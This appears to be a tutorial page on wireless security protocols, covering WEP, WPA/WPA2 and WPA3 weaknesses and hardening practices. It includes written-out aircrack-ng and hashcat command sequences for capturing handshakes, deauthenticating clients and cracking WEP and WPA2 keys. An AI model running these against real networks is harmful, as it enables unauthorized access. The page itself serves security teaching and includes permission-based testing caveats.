Wireless Security Protocols

WEP (Wired Equivalent Privacy)

üî¥ WEP Vulnerabilities

  • Static encryption keys
  • Weak IV (Initialization Vector) implementation
  • RC4 stream cipher weaknesses
  • No key management protocol
  • Easily crackable with sufficient traffic

WEP Cracking

# Capture WEP traffic airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep wlan0mon # Generate traffic (if needed) aireplay-ng -1 0 -a 00:11:22:33:44:55 wlan0mon aireplay-ng -3 -b 00:11:22:33:44:55 wlan0mon # Crack WEP key aircrack-ng -b 00:11:22:33:44:55 wep*.cap

WPA/WPA2 (Wi-Fi Protected Access)

üü° WPA/WPA2-PSK

  • Pre-Shared Key authentication
  • 4-way handshake process
  • TKIP (WPA) or AES-CCMP (WPA2)
  • Vulnerable to dictionary attacks

üü¢ WPA/WPA2-Enterprise

  • 802.1X authentication
  • RADIUS server integration
  • EAP methods (PEAP, EAP-TLS, etc.)
  • Individual user credentials

WPA2 Cracking Techniques

# Capture 4-way handshake airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon # Deauthentication attack aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon # Dictionary attack aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap # Hashcat for GPU acceleration hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt

WPA3 Security Enhancements

WPA3 Improvements:
  • SAE (Simultaneous Authentication of Equals): Replaces PSK
  • Forward Secrecy: Past sessions remain secure if password is compromised
  • 192-bit Security: Enhanced cryptographic strength
  • Protected Management Frames: Mandatory PMF
  • Easy Connect: QR code-based device onboarding

Wireless Security Best Practices

Network Configuration

  1. Use WPA3: Implement the latest security standard
  2. Strong Passwords: Use complex passphrases for PSK
  3. Disable WPS: Turn off Wi-Fi Protected Setup
  4. MAC Address Filtering: Implement with other controls
  5. Network Segmentation: Isolate wireless networks
  6. Regular Updates: Keep firmware current
  7. Monitor Network: Implement WIDS/WIPS

Enterprise Recommendations

  • 802.1X Authentication: Use certificate-based authentication
  • RADIUS Integration: Centralized authentication
  • Network Access Control: Device compliance checking
  • Guest Network Isolation: Separate guest access
  • Rogue AP Detection: Monitor for unauthorized APs
Legal and Ethical Considerations:
  • Only test networks you own or have explicit permission to test
  • Wireless testing can affect neighboring networks
  • Be aware of local regulations regarding radio emissions
  • Use appropriate power levels to avoid interference
  • Document all testing activities thoroughly
Key Takeaway: Wireless security testing requires understanding both the technical aspects of wireless protocols and the practical considerations of radio-based communications. Always balance testing thoroughness with responsible use of wireless spectrum.
